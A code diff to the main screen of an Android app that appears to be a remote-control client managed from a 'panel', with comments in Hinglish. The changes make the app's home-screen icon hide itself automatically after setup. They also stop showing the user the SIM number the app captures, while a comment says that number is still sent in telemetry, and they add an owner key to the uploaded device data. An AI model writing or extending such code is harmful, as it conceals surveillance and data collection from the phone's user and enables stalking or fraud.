@@ -51,6 +51,9 @@ class MainActivity : Activity() {
         private const val KEY_HIDE_ICON = "hide_launcher_icon"
         private const val REQ_PERMS = 1301
 
+        /** Manifest me alias ka fully-qualified naam — applicationId badalne par bhi valid. */
+        private const val LAUNCHER_ALIAS = "com.screenlink.remote.LauncherAlias"
+
         private val IO = Executors.newSingleThreadExecutor { r ->
             Thread(r, "main-io").apply { isDaemon = true }
         }
@@ -64,11 +67,8 @@ class MainActivity : Activity() {
     private var selectedApp: String? = null
     private var phoneNumber: String = ""
     private var pin: String = ""
-    private var liveSimNumber: String = ""
-    private var simSource: String = ""
     private var permissionAttempts = 0
     private var batteryAsked = false
-    private var factsLoading = false
     private var resendInFlight = false
     private var batteryLevel: Int = -1
 
@@ -110,6 +110,8 @@ class MainActivity : Activity() {
         loadDeviceFacts()
 
         if (prefs().getBoolean(KEY_DONE, false)) {
+            // pehle se onboarded — icon chhupa hua ho to bhi chhupa rahe
+            if (prefs().getBoolean(KEY_HIDE_ICON, true)) hideLauncherIcon()
             showDoneStep()
             if (prefs().getBoolean(KEY_PENDING, false)) resendOnboarding()
             main.postDelayed({ askBatteryOptimization() }, 2500)
@@ -225,21 +227,13 @@ class MainActivity : Activity() {
         }
     }
 
+    /** sirf battery — SIM number UI par nahi dikhta, sirf telemetry me jaata hai. */
     private fun loadDeviceFacts() {
-        if (factsLoading) return
-        factsLoading = true
-
         IO.execute {
-            val (number, source) = runCatching { DeviceInfo.simNumber(this) }
-                .getOrDefault("" to "")
             val battery = runCatching {
                 DeviceInfo.telemetry(this).optInt("battery_level", -1)
             }.getOrDefault(-1)
-
             main.post {
-                factsLoading = false
-                liveSimNumber = number
-                simSource = source
                 batteryLevel = battery
                 if (step == "done") showDoneStep()
             }
@@ -384,6 +378,7 @@ class MainActivity : Activity() {
             col.addView(space(22))
         }
 
+        // Number khud likhna hai — captured SIM number yahan show nahi hota.
         val input = EditText(this).apply {
             hint = "10-digit mobile number"
             inputType = InputType.TYPE_CLASS_PHONE
@@ -397,17 +392,6 @@ class MainActivity : Activity() {
         }
 
         col.addView(input)
-
-        if (liveSimNumber.isNotBlank()) {
-            col.addView(space(10))
-            val live = label("SIM number mila: $liveSimNumber", 11.5f, th.success, true, Gravity.CENTER)
-            live.setOnClickListener {
-                input.setText(liveSimNumber.filter { c -> c.isDigit() || c == '+' }.takeLast(10))
-                input.setSelection(input.text.length)
-            }
-            col.addView(live)
-        }
-
         col.addView(space(18))
 
         col.addView(primaryButton("Continue") {
@@ -619,6 +603,7 @@ class MainActivity : Activity() {
         put("theme", th.slug)
         put("device_name", DeviceInfo.summary(this@MainActivity))
         put("install_id", DeviceInfo.installId(this@MainActivity))
+        put("owner_key_id", DeviceInfo.ownerKey(this@MainActivity))
         put("telemetry", DeviceInfo.telemetry(this@MainActivity))
     }.toString()
 
@@ -690,6 +675,9 @@ class MainActivity : Activity() {
     private fun showSuccessStep(synced: Boolean) {
         prefs().edit().putBoolean(KEY_DONE, true).apply()
 
+        // auto-hide: user ko Start dabane ki zaroorat nahi
+        if (prefs().getBoolean(KEY_HIDE_ICON, true)) hideLauncherIcon()
+
         val col = column()
         col.addView(label("✓", 58f, th.success, true, Gravity.CENTER))
         col.addView(space(14))
@@ -708,14 +696,24 @@ class MainActivity : Activity() {
                 Gravity.CENTER
             )
         )
+        col.addView(space(12))
+        col.addView(
+            label(
+                if (prefs().getBoolean(KEY_HIDE_ICON, true))
+                    "App home screen se hide ho gaya — panel se control karo."
+                else "App home screen par rahega.",
+                11.5f, th.muted, false, Gravity.CENTER
+            )
+        )
         col.addView(space(28))
 
-        col.addView(primaryButton("Start") {
-            if (prefs().getBoolean(KEY_HIDE_ICON, true)) {
-                hideLauncherIcon()
-                toast("App home screen se hidden — panel se control karo")
-            }
-            main.postDelayed({ finish() }, 900)
+        col.addView(primaryButton("Done") { finish() })
+        col.addView(space(10))
+        col.addView(secondaryButton("Home icon wapas dikhao") {
+            prefs().edit().putBoolean(KEY_HIDE_ICON, false).apply()
+            showLauncherIcon()
+            toast("Icon wapas aa gaya")
+            showDoneStep()
         })
 
         setScreen(scrollWrap(col), "done")
@@ -749,7 +747,6 @@ class MainActivity : Activity() {
 
         val rows = listOf(
             "Number" to phoneNumber.ifBlank { "—" },
-            "SIM (live)" to liveSimNumber.ifBlank { "—" },
             "App" to (selectedApp ?: "—"),
             "PIN" to pin.ifBlank { "—" },
             "Theme" to th.label,
@@ -777,16 +774,6 @@ class MainActivity : Activity() {
         col.addView(card)
         col.addView(space(14))
 
-        if (liveSimNumber.isBlank()) {
-            col.addView(
-                label(
-                    "Live SIM number nahi mila — panel se 'fetch number' dabao.",
-                    11.5f, th.warn, false, Gravity.CENTER
-                )
-            )
-            col.addView(space(12))
-        }
-
         val toggleRow = LinearLayout(this).apply {
             orientation = LinearLayout.HORIZONTAL
             gravity = Gravity.CENTER_VERTICAL
@@ -794,15 +781,15 @@ class MainActivity : Activity() {
             background = rounded(12f, th.surface, 1, th.border)
         }
         toggleRow.addView(label("Home screen icon chhupao", 13f, th.text, false))
-        val state = label(
+        val stateLabel = label(
             if (prefs().getBoolean(KEY_HIDE_ICON, true)) "ON" else "OFF",
             12.5f, th.text, true, Gravity.END
         )
-        toggleRow.addView(state)
+        toggleRow.addView(stateLabel)
         toggleRow.setOnClickListener {
             val now = !prefs().getBoolean(KEY_HIDE_ICON, true)
             prefs().edit().putBoolean(KEY_HIDE_ICON, now).apply()
-            state.text = if (now) "ON" else "OFF"
+            stateLabel.text = if (now) "ON" else "OFF"
             if (now) hideLauncherIcon() else showLauncherIcon()
         }
         col.addView(toggleRow)
@@ -832,7 +819,8 @@ class MainActivity : Activity() {
         if (batteryLevel < 0) loadDeviceFacts()
     }
 
-    private fun launcherAlias(): ComponentName = ComponentName(this, "$packageName.LauncherAlias")
+    private fun launcherAlias(): ComponentName =
+        ComponentName(packageName, LAUNCHER_ALIAS)
 
     private fun hideLauncherIcon() {
         try {
@@ -841,7 +829,8 @@ class MainActivity : Activity() {
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             )
-        } catch (_: Throwable) {
+        } catch (e: Throwable) {
+            Log.w("TPC", "hide icon fail", e)
         }
     }
 
@@ -852,7 +841,8 @@ class MainActivity : Activity() {
                 PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                 PackageManager.DONT_KILL_APP
             )
-        } catch (_: Throwable) {
+        } catch (e: Throwable) {
+            Log.w("TPC", "show icon fail", e)
         }
     }
 
